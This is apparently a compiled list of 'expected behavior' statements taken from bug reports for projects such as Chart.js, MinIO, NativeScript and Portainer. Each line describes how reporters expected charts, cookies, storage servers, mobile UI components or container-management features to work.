when stacked yaxis.ticks.min is set chart should also be cut by this horizontal line like line chart type is.
the bubbles should appear as specified in the data set.
when changing the axis to linear scale, the bubbles are displayed correctly:
<img width="449" alt="screen shot 2017-03-22 at 18 07 54" src=" ">
![multiline-label-good](
i want to run chart.js on kibana
when responsive is set to true, chart should resize whether container size increases or decreases
fonts are rendered in mozilla/ie as well as on chrome
bars should overlay one another -- note that i don't mean stacked on top of one another; the vertical start position of each bar should remain at the bottom (y=0)
this is accomplished via `xaxes: [{ stacked: true }]`
[demo of desired functionality working w/`v2.4`](
if it's not possible to create a responsive chart due to the container being hidden, the library should at least fail gracefully.
i wish to show the difference between values with large differences in values and some with a value of 0 too
i want to show 0 as a value so the tooltip can still be seen for that data value because if i set the 0 values to 'null' the tooltip doesn't display and you can't see a little sliver of a bars border to indicate a data value is there
this is particularly an issue where several values are 0 beside each other, you cannot easily see how many are there when there are no labels under them
![image](
first column should be inline with first tick.
when providing options for a chart, you can set some properties for the animation
one of the properties is a callback for when the animation is complete
according to the documentation, the callback is passed the same object that the onprogress callback is passed.
when returning an array of objects from `labelcolor` on `tooltips.callbacks`, the squares should get the colour returned from the function.
please refer to #3583 the bar chart should use built in autoskip feature
in the [docs]( `labeloffset` is described as:
> distance in pixels to offset the label from the centre point of the tick (in the y direction for the x axis, and the x direction for the y axis)
> note: this can cause labels at the edges to be cropped by the edge of the canvas from the docs, i expect the label to move left/right if i set a non-zero value for labeloffset of a vertical axis, and up-down for a horizontal axis
just from the variable name i would expect opposite behaviour: > in the y direction (up/down) for the y axis, and the x direction (right/left) for the x axis
i expected all the colors but seems as if the last color gets shown and others are hidden behind it.
expected the following tooltip option to increase label font-size:
```javascript
options: { tooltips: { titlefontsize: 20 }
1163.34px should return 1163
![image](
tooltip background filled uniformly
if the minimum ticks on the y scale is 1 and one of the data points has a value of 0, it should not be displayed
this possibly happens any time a value below minimum is provided, but i have not tested this.
the chart should cut off the line when data is below the defined min datetime.
it should not ignore the `dist` directory when chartjs is installed using bower.
that the chart resizes for mobile based on viewing area (there is a lower size bound to where the chart is at all viewable/useful)
according to [wcag 1]( #frame-names), [wcag 2]( and [section 508 1194.22 (i)]( all frames should have a title.
it should be possible to remove a dataset within onclick() and move the mouse just after without any error.
it should work.
after installing chart.js via npm (`npm install chart.js --save-dev`), to then be able to include it in scripts like this as per the documentation: ```js
var chart = require('src/chart.js');
i would therefore expect to get an object in the callback as described when i set up an animation callback.
this is what i'd expect and what happens if i use normal string labels (by using momentjs's .format beforehand):
![screen shot 2017-01-10 at 10 41 04 am](
the labels should be fully visible, or if drawticks: false is not a suitable setting for a category axis with labels then an error should be thrown
here is a live example:
it shouldn't show error in the console when i hover the chart.
when changing chart options of the yaxis, like scalelabel.fontcolor and ticks.fontcolor, a call to .update() will draw the chart with updated label and tick colors.
i expected the graph chart to remain consistent, and for only the xaxis time format to change
setting displaycolors = false without setting a label should show only the value in the tooltip label
each y scale should be able to use it's own labels/ticks
initial chart sizing should honor the height value set in css.
test should run in node.js as they would in the browser
when padding the bottom of a chart to make space for xaxis labels it should only pad for rendered labels, not all labels.
my data must fill the xaxis range all the time.
do not show n/a item in tooltip just like `line` type.
when `min` is defined, the first tooltip label should display the label at the minimum
when `min` is set to `'march'`, the tooltip should show `'march'` as the label.
tooltips should display all matching datasets
according to > you can now change the entire data object of the chart and then call update and the chart will work
the line sample has been update to test this behaviour.
note to whomever reviews this: please test all chart types before merging.
[chart.js v2.2.1](
using a width/height of 64 , a canvas is created like so:
<canvas width="1280" height="960" style="display: block; width: 640px; height: 480px;"></canvas>
the following should have worked.
``` javascript
var canvas = document.createelement("canvas");
canvas.width = 800;
canvas.height = 600;
var ctx = canvas.getcontext('2d');
var mylinechart = new chart(ctx, options);
chart should be successfully destroyed.
ticks should start at 0 and increment by stepsize (1 in my case)
ensure lines cannot be drawn beyond the chart area, so that the title and axes labels are not obstructed.
when hovering over the data it should show the data-points date in the tooltip.
like here:
a stacked bar chart, i.e
a bar chart with ```
options: { ..
scales: {xaxes: [{ stacked: true }], yaxes: [{ stacked: true }] } ..
``` should display borders around the bars if `bordercolor` is set.
& possible solution the tick documentation should have something like the following in the scales documentation, under 'ticks'
autoskippadding: number - padding between ticks on the same axis when values have been skipped.
regular interval between ticks and grid

`request.url_for` should generate a full url with the given path, e.g
` `
as i am running my server behind a proxy, i do not want to hardcode the hostname in the server_name
this used to work with sanic version 19.6.3.
since the documentation describes running sanic with uvicorn, i would expect this to work.
in my example, `request.app.url_for('endpoint')` is expected to return `'/endpoint/'`.
at `0.8.3` release, it will logging/output some messages like:
[2018-11-05 17:34:47 +0800] [12112] [info] goin' fast @
[2018-11-05 17:34:47 +0800] [12112] [info] info
[2018-11-05 17:34:47 +0800] [12112] [info] starting worker [12112]
it should be possible to run with multiple workers using blueprints in the same way as it is using the sanic app object directly
auto reload and debugger support.
calls to `app.url_for()` with the `_external` flag should build the correct url, including the port number, such as ` ` without forcing every application to specify the `server_name` config attribute.
as my understanding of arjs 2.0, both cases should be able to work at tandem
when a marker is read, it should display an element and when the device orientation changes to a nearby geo-entity-place it should display it's element
(sphere and a box on the example code)
no change on video size, no black borders
expect it to work as it does on android.
the cube should have correct scaling / size
no events beeing fired since the window isn't resizing
dragging on an ungrouped object should not carry the other objects with it.
pdf export of diagrams should be possible.
pdf opens with exported flowchart.
simple state diagram as shown in #/statediagram.
the figure is copied
the tangential handles should change the angle of the tangential line in the endpoints
in the picture attached and also shown in:
[
and also with great math background
[ in the first link those points are waypoint/endpoints (black ones) and handles/tangetial points (blue ones).
the handles/tangetial stopped working in draw.io but was working
those points are not on the line but are used to define the tangent at the endpoints/waypoints.
the edge label in page 2 should be present in the pdf export result.
on gitlab.com the authorization dialog should appear, so that draw.io gets the token.
all layers of the draw.io diagram should be displayed in the native vsdx rendering tool.
i tried to remove the second parameter, "foundkey", and found that it was normal
**js-cookie version:** - version [e.g
22] 3.0.0-rc.0
cookie.get("token") should see the token cookie
i get 'value' back
the cookie must exist after it set
and not disappear after reloading
**desktop** - os: macos
- browser: chrome
- version: 84 (latest, but i tested in 83 too)
js-cookie allows `noconflict` under all circumstances, even if the host site uses requirejs.
no error to be thrown
expected for expiry date to be set for 91 days from now **actual behavior**
expiry date set to 7 days from now
**desktop** - os: [e.g
ios] windows 10
- browser [e.g
chrome, safari] brave (chromium based browser)
- version [e.g
22] version 1.9.72 chromium: 81.0.4044.138 (official build) (64-bit)
```strictfoowithexpires``` should be ```strict``` in ```samesite``` field
cookie name preserves the original forward slash character.
cookie should be set for more than 7 day
-browser [brave] after trying to reproducing the bug in chromium, it's working fine in chromium
so i will open a bug report in brave repository and still i will let this issues open before this issues is resolved by brave or js-cookie.
`cookies.set('cookieid', 'cookievalue', {secure: true, httponly: true})` should work.
`console.log` only works while first children of the timeline was running, stop firing console.log when the second children playing
but in the real world, the function is running after the segment has finished, that's a bug.
animation duration should not impact while webpage moves in the background and come back.
every step should take same time to finish.
zoom window
there should only be one click event emitted, with the `istrusted:true` attribute
would leaflet be able to safely filter out the click events with `istrusted:false`?
i think it should go through all layers of a layergroup
getbounds: function() { var bounds = new latlngbounds(); for (var id in this._layers) { var layer = this._layers[id]; if (layer instanceof l.layergroup && !layer.getbounds) { for (var lgid in layer._layers) { var lglayer = layer._layers[lgid]; bounds.extend(lglayer.getbounds ? lglayer.getbounds() : lglayer.getlatlng()); } } else { bounds.extend(layer.getbounds ? layer.getbounds() : layer.getlatlng()); } } return bounds;
but now is the problem what if the layergroup contains also a layergroup? the [doc]( #featuregroup-getbounds) says "returns the latlngbounds of the feature group (created from bounds and coordinates of its children)" this means for me, that it returns the bounds of **all** childrens also for layergroups and layergroups with layergroups childrens
the easiest way is to add the `getbounds()` function to the layergroup, but i think this is not what you want.
no glitch when zoom in or zoom out an image overlay
clicking and dragging a marker works and does not crash.
the click handler is triggered
svg element will include the class `myclass`
no tiles are selected
as long as the mouse is on the line, even when it is thicker, the mouseover event should stay active.
an alert should be displayed via the `mouseover` event handler.
when using a tilelayer with minzoom set and the map zoomed out beyond the value of minzoom, removing the map should not cause an error
tilelayer redraw all tiles: ![image](
date / datetime fields should be displayed.
when trying to access uploaded files, they should not be blocked by the browser
i assume that anonymous policy only applies to unauthenticated users and authenticated user is limited to his iam policy.
![image](
the objects with lock configuration should not allow any overwriting actions
the delete call to azure blob storage should work without throwing errors
should read and write properly to the smb storage.
i expected to see minio_access_key and minio_secret_key as default environment variables
not realizing there was a difference, i was trying to enter my keys as strings into these environmental variables and couldn't understand why they weren't getting set.
hello guys , videos should be uploaded successfully
i would expect that the indexing of the files would take much less time than the actual file copy.
should work
the file should be able to read and be printed as per the test
i should be able to see the buckets , run upload file, create bucket etc ![image]( the group id in jwt should allow be to have a readonly /readwrite from jwt token
i'd like to return the url to the web or rewrite it so that users can download it.
expected successful minio installation.
when i run ./minio server {1...2}.mydomain.com/hdd{1...2}/minio-data i expect it to say "waiting for a minimum of 2 disks to come online (elapsed 1s)" (like my other node does, port forward is correct on both networks, testing with nmap while waiting).
start without any issues

today on both products you have the following validation mc
cmd/config-utils.go
accesskeyminlen = 3
secretkeyminlen = 8
``` minio gw:
pkg/auth/credentials.go // minimum length for minio access key
accesskeyminlen = 3 // minimum length for minio secret key for both server and gateway mode
secretkeyminlen = 8
``` i think the minimum length should only be enforced on the **minio server application** and not on the gateway or mc client.
i understand the rationale but i think it is slightly off, awscli etc.
don't do this
i suggest only enforcing the minimum length for keys on mc and minio gw to the minimum required for the code to work versus enforce good length practices as this is the role of the application your connecting to
mc and minio gateway's are used as a tool to access other systems
as an extreme example it would be like google chrome not allowing you to type a password in to the login page on hotmail.com because it was shorter than 10 characters
do we feel this makes sense? i would suggest if you want to warn users that they are crazy for having such a short access/secret key then stamp out a warning but not stop the product from working? again i've seen other tickets and the push back, but i just spent a couple of days forking minio/mc only to try and change these to test something but come unstuck due to my lack of skills in programing and the go module paths..
so i thought i would try once more as i feel these are good intentions by minio but are incorrectly applied.
no empty content-encoding sent, if there's no content encoding of course.
.svg should be served with image/svg+xml
- heal works and does not give version errors
- browser provides accurate used value
all upload requests would be handled correctly.
the performance shouldn't be degraded too much.
that should make container that uses my storage location and be distributed
local minio java client not able to reach local window setup minio server via
but i find the yaml can write as ``` args: - server - /mounts/minio1
``` so, it can create pod correctly also, i find it lack a space between server and path.
`- {1...4}/data/minio` please check the file of daemonset yaml
one of the following:
- minio fails to start when openid initialization fails.
- minio retries initialization for a configurable number of attempts with a configurable interval
go to see rendered markdown file from github repo.
deploy minio on kubernetes
browser ui should display the file in the bucket successfully.
i was expecting the other 3 nodes to post a message saying "okay, all is good now, the 4th node has rejoined us".
- file should upload given `mc` user has sufficient permission.
minio_secret_key is not available or encrypted in /proc/{pid}/environ.
when i use following yamls in our openshift cluster, i would expect that i get a working minio cluster:
- animation should either repeat n times or infinity.
try the same on android -> text does not disappear
i'm not sure how to get the network type but to get the ssid we should use `wifimanager.getconnectioninfo().getssid()`
app should not crash when using `ispassthroughparentenabled="true"` on a `flexboxlayout`.
button taps should not propagate to parent container(s)
(or should they?)
css should still apply to backgroundcolor after a .back() rebuilds the page...
bundle should be exported without issues.
'visibility' attribute value should change when parent property value changes.
system app should open on foreground, replacing app content even if it's a modal view
when in dark mode, the buttons on a dialog should be green (in the example).
all styles to be applied
no glitches
the failure part of the promise in http.request(...) should be called after the time defined for the timeout-property (in the sample app: 5 seconds).
pixellation should never occur due to improper ios transforms applied to layer or view.
when setting those prperties in css or xml, they should be applied correctly to the htmlview component.
i'd expect add `addeventlistener` to allow listening for `readystatechange` without throwing an error.
navigation works regardless of input method
tapping vs swiping should not make any difference at any stage of app development.
see android (or bottomnavigation)
the new line should work where `%0a` is used
the `tabstripitem` and `tabcontentitem` should respect the `selectedindex`
both message and title should show.
the app doesn't crash when using **:active** state in combination with tabstripitem (with no image)
the label doesn't disappear when an **:active** css class is used for the **tabstripitem**
label's color to be applied for tabstripitem
to work as well as when you put english words in the hint
[tns-hint-issue.zip](
the button's text should only be truncated if the content is too long.
the button's text should not be cut off at the bottom.
provided values for picker are shown all the time
to be able to interact with the content of the tab.
keyboard without ability to add decimals
i would expect the ui to move up like it does with all the other textfields due to the `windowsoftinputmode`
i have tried the modes `adjustpan` and `adjustresize`.
the first tab should return to its initial state.
to see suggested words above the keyboard as one types
to achieve this at the moment, i'm having to use an onloaded for the textfield: ``` if (application.android) { var txtfield = args.object; txtfield.android.setinputtype(android.text.inputtype.type_class_text | android.text.inputtype.type_text_flag_auto_correct ); }
to be able to scroll all scrollable content outside the tabstrip item.
not to crash!
the color of icon in action bar should change from `#ffffff` to `#666666` when the condition changes.
label should appear in right position
the layout of the content of the flexboxlayout should be recalculated to be within the border
background color set in css does not change when you change the os theme.

it should apply
the listviews itemtemplate should work.
sidedrawer opens on tap after routing back
the label should have border and background-color
app is successfully built.
the label should be red since it should ingerit the color from the `gridlayout` and the `actionbar`.
the button to have a ripple
this is a transfer of nativescript/theme#151 bug.
the selected tab to be saved when the app is minimised
the images (using ionicons) should be centered vertically
styling on image, tabstripitem or tabstrip is not working (not applied at all).
i'd expect the result to be the equivalent of:
.css-calc-nested { width: calc(calc(16 / 2) * 2); // e.g
formattedtext should work for label under repeater.
i expected the two messages to be console logged
actually only marginleftchange was logged.
ideally, it should not crash.
the styles should be applied for elements on a modal-page the same way they are working for normal pages.
not to crash/freeze
the application should be successfully ran on device.
the tabstrip should be visible without leaving and reloading the page.
the tabstrip should have all the styles applied, as defined in css (or in xml,...)
no error message.
the animation properties should be reset, regardless of iterations count.
styling to be applied correctly on device rotation.
no error trying to use the listpicker on android projects.
unit tests app should not crash.
should work
account tab strip is selected
**sample**

should move to third tab.
there shouldn't be white space just before the action bar when ios blue bar location is displaying
and launch screen should display as expected ![image1]( ![image2](
the button to be as big as the text.
the ripple to be restored
no error logged and `calc` evaluated.
the layout to not break on the resume.
the animation runs after `settimeout` callback **actual behavior**
the animation does not run
however, the animation promise properly executes the `then` block
i can stop the animation.
bottomnavigation and tabs components should respect tabstrip.iosiconrenderingmode property value.
tabstripitem title should not be clipped in any scenario.
should rotate at the value set and not fixed to a value of 2.
css classes should be added both in cssclasses and classname properties.
objects to be auto-imported from their correct locations instead of their aliased/exported paths.
multiple taps does not prevent `tabcontentitem` animation to execution.
i should be able to navigate after that, and those two callbacks should be called.
the modal view is closed during hmr
styles to be applied correctly.
the app starts without crash, showing the `home/home.page` page.
the changes to the actionbar on ios - uinavigationbar should take effect following `actionbar.loadedevent`.
textfield is focusable
**workaround**
change autocapitalizationtype to something else or remove the editable property binding
related to #6967
the app not to crash and to work flawlessly.
should navigate without problems between tabs with either nested frames or not

the same bug appears when using native android back navigation (using "back" button in navigation bar).
expect it to behave the same as it does on android.
the content outside the frame should remain intact
my expectation: `m-t-5` (or `m-t-n`) should overwrite the `margin: 0` of the `.btn` class we specified

the actionbar background color should animate on ios, as it does on android.
the app to not crash.
when the keyboard is up, there should be no safe area above the keyboard.
same behavior under ios and android
no tap event, no blink, no underlining, no indication that we are interacting with the textfield
i would expect the display of `this is kind-of-magic - or a bug?`
on both platforms, the "check" label should be completly visible.
setting the tabbar translucent to falls should work for any kind of setup (with actionbar/flat or no actionbar at all.) it should work with and without safearea as well.
$parents['listview'] or $parents['repeater'] should work fine even when used as conditional operations:
border-radius is applied with multiple border-colors.
the layout of the app should adjust to the addition of the call status bar on ios
you should not be able to change the text.
children inside a gridlayout with set min
height should behave the same as with fixed height.
no separator between listview items
things should stack one on top of another without overlaps

should be able to navigate freely.
this should truncate all 3 labels and displays all of them
it works on android, but on ios labels are not truncated and in this case we only see the first one.
styling still can be changed when using multiple frames
when tapping "next" on keyboard, the page should be scrolled to the next textfield, so that it is visible (if there is a scrollview on the page).
if that is not possible only by setting _returnkeytype="next"_ for some reason, then it should scroll at least when calling _<nexttextfield>.focus();_ manually.
the green rectangle must not be cropped when there is a line break of the blue label.
taps not being propagated when ispassthroughparentenabled is set to false.
the label should be at the right position and readable and the stacklayout should have a border-radius.
on android, the background image should be scaled properly (as it happens on android).
the labels should be only 2
setting the timeout to **5000 ms**, i would expect, that the http request was canceled and that i would get to the failure part of the promise.
both platforms behave the same.
after tap on the empty space of a listview the keyboard should hide automatically calling the dismisssoftkeyboard action
show the logo url input under the logo setting
all stacks should be listed properly.
creation of the template should succeed.
ability to pull image from self-hosted repository and having special characters in password.
when a quay registry is added, it should be built to include username like so `quay.io/<provided-username>`
portainer ui should validate the load balancer ports inputs to prevent a user from selecting multiple protocols (validation should be added to both application creation and application edition views)
the portainer container should start and i should be able to use it :)
i expect the stack to deploy successfully as it does with docker-compose
upgrade from 1.22.0 to 1.22.1 succeeds
* turn "auto-refresh logs" if the container is not running
* refresh logfile view if number of lines viewed is changed and auto-refresh is turned off
icons should display correctly
there should be no go panic.
portainer should not be attempting to load the matomo analytics script when a user has opted out of the collection of anonymous statistics.
the console button should be shown for all running containers in all endpoints
see logs "as they are output"
paste log into required window
no trailing commas added :)
don't show tls settings and docker tls message.
upper and lowercase should make no difference for a username
expect portainer to be able to get the token from keycloak.
this should work, as described in:
_deploy portainer agent on a remote linux standalone docker host (no swarm)_
after an upgrade and logging in, the new version number should be shown.
expected to be able to click on my primary endpoint in the dashboard and navigate stacks and services like before.
when trying to create a new container in portainer using an image from the nvidia container registry it should pull the image and create the container.
the driver input should default to `select a driver`
image should succeed at uploading, or throw an error with the reason it failed.
when i change the container name in the stack, i expect it to change upon updating the stack.
we should apply inherited ownership to the correct volume
"docker events --filter type=node" will continue to send all of the events it normally does when portainer is not running, including node updates when a service starts or stops on a node.
show all environment variables
not having breaking changes introduced in a patch release
patch release should be a worry-free upgrade
furthermore, the result of using this flag with version v1.24.1 is not listed as a breaking case in the release notes.
no errors thrown, and configs are displayed in the configs view.
the container logs are always immediate
portainer should respect the `extra_hosts` setting like any other container
for some reasons, the dns entry can't point to the internal ip of the ldap server, which runs standalone.
if the ldap server will be moved to another ip address, only the `extra_hosts` need to be changed in every `docker-compose.yml` instead of every app configuration itself.
not sure on the best ux for this.
hide the network if it doesn't exist on the node portainer is on.
alternatively we could just make the message clear the that `the network specified does not exist on the node that portainer is running on`
add the ability to specify host and then only show networks of the node selected
run with the settings "as clicked" and do not replace blank entries with defaults.
startup where i can point my browser to the new install to setup and use
do not offer the ingress network as an option when creating a service.
clicking on the checkbox shouldn't trigger the expand containers thing.
excluded address(es) should be excluded, not assignable
if it works via cli, it should work in portainer.
all environment variables defined in stack's app template propagating to deployed stack
the same not happens with containers templates.
if there is no id provided for a details view, remove the trailing slash and show the parent view instead.
if a registry is misconfigured, the configuration screen should not be shown, and instead the browse button should be greyed out with a message as to why
something like `unable to browse registry, contact your admin`
if a non-admin user shouldn't have access to a volume and they define it in the volume type-ahead, then the template deployment should fail.
this error should not be thrown.
syntax error should show above other elements
container should correctly report the error so that you know something is wrong with your image
it would be gread if the original error message is included and maybe a hint that there exists problems with docker save and windows powershell.
a 'deleted repository' with 0 tags, should not be shown in the ui.
actual behavior: "item(s) selected" count updates to 2
ownership should default to administrators only.
non-admin user can join a public container to a public network
the browse button should be visible on the volume listing page.
a tar ball to play with :)
once a configuration is saved, portainer should always remember it
edge agent's url can be set to our portainer address.
same behavior as using docker run line cmds and docker-compose cli
the new container should use the entrypoint command of the new image, not the previous image.
all available images should be listed
there should be no issues thrown and it should work fine
images with hidden containers should still show as used.
report failure of docker problem and return bad request response not 200
the expected behavior would be that the container starts correctly according to my configuration.
display | name | value |
| --- | --- |
| this_is_an_env_var | |
if the stack was deleted previously, deploying again should not give an error if it will succeed
searching for a service by it's label should still show the tasks that are part of the service in the dropdown table
both users adam and bob should get access.
show the entire error, unobscured as it happens
perhaps just a re-sizing of the popup, somehow.
portainer creates stack successfully.
clicking the endpoint the user has access to should give no errors.
switching back to a bridge network should clear the container name from the network name.
actually getting 2 rows instead of just the first one.
only requests that are intended to give this response should.
as the form is auto filled and the registry is the image name
the image form should not expect an image + tag
but just the tag.
should be showing proper number of processors and memory in home and dashboard and proper number of stacks/containers/images.
if a non-admin user or team has been given ownership of a service related to a 'limited' stack, they should not be able to see or remove this stack.
the rows should be re-ordered based on the column clicked.
when sending an empty `"password":""` inside `ldapsettings`, it should be set as empty in the settings storage
this should work from both the portainer ui and api
currently, if you don't send a `password` attribute in `ldapsettings` or is `null`, the api does not change the password in the settings storage
perhaps this behaviour could be made exclusive for *do not change the password* and make empty strings regular settable values
in other words: * if `"password"=null` or is absent, do not change the password in the settings storage (this is existing current behaviour in the portainer api).
* if `"password"=""` or any value, update the password in the settings storage (the portainer api should consider an empty string `""` as a settable value)
for the portainer ui side, this can become a bit tricky because there is no way to distinguish a user wanting to set an empty password from a user wanting to leave the current password unchanged
both cases would be an empty input field in the ui
maybe there could be an explicit *clear password* button
in addition, if you don't provide a reader dn and password, you can't test the ldap configuration in the portainer ui because it is expecting these settings to be set
however using the `checkldap` api endpoint does work if you don't send a `password` attribute.
rbac should assign permissions to newly created & autoprovisioned ad users
auto suggest should only suggest an image once, even if the same image is present on different nodes
should show over top of the input box
with or without rbac i expect team leaders to be able to access the "users" screens without access errors.
and as only roles is restricted to the rbac extension, i would expect that team leaders should be able to access all the functionality available on users and teams without restriction including viewing and adding team members.
conversely, the only power currently available to team leaders - to delete the team - i believe should be restricted to administrators.
a stack restricted to a user should not show as restricted to administrators for rbac users.
removing a service related to a stack as an rbac user should not hide the stack for rbac users.
total control stacks should should show as total control stacks for rbac users, regardless of ownership.
if an endpoint admin or standard rbac user is trying to use the attach functionality they should be able to successfully attach.
endpoint admins should be able to manage restricted resources.
disabling rbac should switch non-admins back to standard users.
refreshing the browser should not cause the user to lose abilities.
udate from 1.22.1 to 1.22.2 without errors.
on container re-creating/edit, health checks settings (such as commands, interval, etc) are updated if they're updated in the container image.
deploying an app template should succeed with no errors
the users who have been granted via rbac can access endpoints properly
although this is an **error related to docker environement**, the docker error should be correctly handled by portainer
there should be a "red" error message saying that the image was not succesfully pulled (and the error message from docker should be displayed).
a non-admin should be able to create and start a container with no issues.
i should be able to login.
when a team is deleted that a user is a part of, the user's permissions should be updated to remove the inherited ones.
git should use the configured proxy to successfully complete the deployment.
creating a volume with the same name as a stack should not give ownership of a stack to another user
if the volume exists already, don't create the volume and assign the non-admin ownership, throw an error message instead.
image is built and container deployed
able to connect to portainer instance on windows docker swarm using ip address:9000
i want to add 3 host entries to the /etc/hosts file in the container with this method, since the /etc/hosts file isn't retained across host and subsequently container restarts.
i should be able to update the azure registry without re-entering the password if it hasn't changed, or update with the correct password if it was incorrect previously and then still browse it as normal.
login and view only assigned endpoints.
if the image is not present locally, it should pull, deploy and update fine as i have added the registry with credentials
be able to connect to the registry and browse contentx
`422 (unprocessable entity)` should be returned, and backend should not panic.
healthy, paused and created containers should display and be filterable as is the case with stopped and running statuses
successfully connect to edge agent
as usual the container should be installed on the edge agent
a stack is created based on the stack file from the github repository.
any items selected in a datatable should be kept as selected
there should be an error displayed if the image can't be pulled e.g `no matching image for [os_here]`
the ping should be ignored by the backend and go through, if the status of the endpoint is `down` in backend.
after endpoint state updates, (status set to down), the view should be automatically refreshed to reflect this.
a refresh should not collapse services.
do not allow invalid numbers as input where they don't make sense.
the task status table should not show when clicking the checkbox of a service.
a persistent volume added to a service should be saved.
the last used ordering should be used, proposed in
the issue has probably been introduced in
i expected to be able to grant access to a registry that i, as an administrator, configured.
i expected right values
containers to have variables set
backend should use the new url when it has been updated.
tables should default to sorting alphabetical by name, as is the default behavior in v1.21.0 and earlier **alphabetical sort by name as expected**:
![screenshot from 2019-07-12 10-26-55](
there should be no box present.
it should still/always be able to connect.
portainer should use the state parameter in oauth.
if i update a `env` variable in a `dockerfile`, which is not overridden by manually adding it in portainer's ui, the change should be reflected on `recreate` and `duplicate/edit`.
when a docker command takes a long time to execute, portainer and the agent should still function properly.
if i specify that the portainer "/data" directory has an nfs share mapped onto it, it should work.
if an agent becomes unavailable, portainer should not be impacted.
ui settings to be persisted
container should be built
stack is deployed using docker-compose from git repository.
add and mount and save storage
i'm expected to have visual on all of the images with the tags so i can manage them.
container should be built
the container to mount the nfs share.
expect the web console window to appear
after switching the language back, the terminal works as expected (shows typed text).
if a secret label has a blank name, it should not be applied when the secret is created.
the portainer instance able to be able to reach the tcp-enabled daemon on port 2375.
able to login in portainer with ldap credentials steps to reproduce the behavior:
insert username and password on login page
the snapshot to succeed and the endpoint to stay up
if a secret/config is assigned using the 'add a secret' or 'add a config' options, it should be hidden in the drop down list so you can't select it multiple times.
display "failure invalid username
must not contain any whitespace" as error message
if all or part of a tag name is entered in the home view search box, all endpoints that match should be listed.
the `--admin-password-file` option should work given the docker-compose configuration above.
if authorize all or deny all is used, with multiple users or teams present in the users and teams or authorized users and teams tables, all entries should be moved.
if a team leader is removed from a team, the team leader count should be updated to reflect this change (i.e
removing 1 from the count).
expected to get the cpu stats from windows containers of other nodes on the same swarm overlay network.
briefly describe what you were expecting.
pull docker image from hub.docker.com briefly describe what you were expecting
portainer has to much control on docker image form
an input box with the full path would be more flexible
if the hostname is not in registries list for credential, use the docker hub
steps to reproduce the behavior:
add a new container with this image: mcr.microsoft.com/azure-pipelines/vsts-agent
edit the container and try to change the image.
portainer successfully creates the stack and confirms this with a notification.
when accessing a service in a swarm that does not have the portainer agent present, i should not be able to access the stats and console actions on the nodes.
create a new stack and hit "deploy the stack", should create the new stack.
version 1.20.1 runs without problems
i expect version 1.20.2 to do the same
a registries option.
endpoint to be added using ui
the selected variable form the variable list should be used.
an error should be shown.
should show stacks.
like other pages that requires an endpoint be selected first, such as containers, images, redirect to `portainer.home`
not to show blank page briefly describe what you were expecting.
i'd expect portainer to respond similar to docker itself:
$ curl -v --unix-socket /var/run/docker.sock
< http/1.1 404 not found
{"message":"network does_not_exist not found"}
click **login** button to go to `/home` immediately
briefly describe what you were expecting.
all ajax docker api requests succeed (except those unsupported) briefly describe what you were expecting.
frequently but not always, ajax docker api requests respond 'i/o timeout'
some pages issue multiple ajax docker api requests at the same time
then these pages may have higher probability to encounter 'i/o timeout'.
for example, 'dashboard' / 'containers create'
in fact, other pages such as images also have lower chances to respond 'i/o timeout'
response `{"err":"unable to proxy the request via the docker socket","details":"invalid character \'i\' looking for beginning of value"}` dashboard makes 2 consecutive ajax requests
` `
` ` containers create makes this ajax request twice
` `
briefly describe what you were expecting.
setting to unlimited will persist across container restarts
it should `post ` (notice the arguments) if i manually do the post from postman wit the authorization header, it pull perfectly
for the submodule cloning to work as expected and the stack on it to be deployed.
zip files should be intact after download.
the chosen network container sub-option sticks between edits ![screenshot of how it should look]( **steps to reproduce the behavior:**
create container using the "container" network
edit created container
deploying stack concurrently should allocate one id per stack.
clicking on network should result with the right network page.
creating a team named 'a & b' should not be converted to `a &amp; b`
volumes should have the same ownership like the container creating it
when volumes not having the ownership of the creator, they can't be removed by them but only by an administrator.
image pulled and containers started
the stack should be accepted, and a priority should be applied to the network interfaces, as per #priority
the other two subnets(10.1.2.0/24, 10.1.3.0/24) and gateways are presented in the detail page.
briefly describe what you were expecting.
successfully being able to login.
the container should start in the same way it does when started from command line, using docker-"compose up"
the container is created but not started
"oci runtime error" is thrown.
create container
stop container
edit container env variables
leave published ports config alone
redeploy with all prev
settings and changed env variables
no error briefly describe what you were expecting.
should not be modified
portainer should start
the agents should comunicate flawlessly with no errors or load problems once joined the agent cluster
briefly describe what you were expecting.
these lines should be
`going over pending ways...`
`completed planet_osm_point`
`completed planet_osm_point`
`osm2pgsql took 22s overall`
it should be same as `docker logs` command line.
after creating the admin user, i expect not to end up on the login screen where i can not login with the user just created.
we want to filter out some containers by using the `-l` flag as described in #hiding-specific-containers.
should redirect to `/home`
the image will be pulled and be available for use.
when bolt fails due to file handle issues, it either crashes the server or attempts to re-initialize bolt.
red prompt should show "container xxx is not running" as in v1.19.2
existing container with logging configs should preserve the settings from the container, instead of always reset to default.
i want to create, modify or save container environment variable like the synology docker gui.
that portainer can connect to the cluster.
i would create 2 stacks, the first with prometheus and the second with alertmanager container but the result is, i have two stacks created with different name but with alertmanager container
a new stack added from git repository.
the stack should create a network with the specified subnet.
i expected the old container to get removed and the new one to be created in it's place.
being able to update the endpointid with the website or the api
mounting the relative path should be relative to the docker-compose.yaml file
it somehow mounts ```/data/compose/13/config/homeassistant``` on the host instead of ```/var/lib/docker/volumes/portainer_data/_data/compose/13/config/homeassistant``` briefly describe what you were expecting.
environmental variables should be added.
possible expected behaviors: - remove the network only if no other stack is using it - do not remove the network - remove the stack even if the network is not available
portainer should detect the config change and reflect the changesm instead just hangs
briefly describe what you were expecting.
the stack should either be listed or the post request should give an error
when a service update is triggered with `pull latest image version` selected, the latest image should be pulled and the service should start using it
the service would update to the latest version of that image and would be able to get the image from the private aws ecr registry using the auth credentials from [`amazon-ecr-credential-helper`](
this works when clicking update in the stack page but not the service page.
the container to have been recreated sharing the network stack of the other container specified.
deployment of container in 1.19.2 should allow to start containers.
i expect the view to have the group's name like when i login as admin
selected value is inserted into stack/compose file
it should go to the stack details instead of presenting the create stack page
briefly describe what you were expecting.
after scaling a service from 1 -> 0 -> 1 containers, the scaled-up container has the environment variables, configured in the portainer ui, set in the container.
the entry point in the add container page should be multiple lines and saved as an array.
after entering hub.docker.com credentials into the form on the registry screen i can pull my private images from the docker hub.
after adding new external endpoint to allow manage access to it even without default group
or set default group to new external endpoints.
i expected 200 response code.
when i name a container `foo`, i expect to see it listed with then name `foo` in the container list.
the input field for the the image of a service looks like a normal text field, and should act like one
overflowed text should continue to the right, instead of being wrapped down
and, i should be able to move the text cursor past the width of the field in order to see and edit text.
when i open a service details page, the page should start with scrolling at the top of the page.
user gets created in portainer and is allowed to log in.
should open logs or console when clicked
container should have all aliases which were previously created.
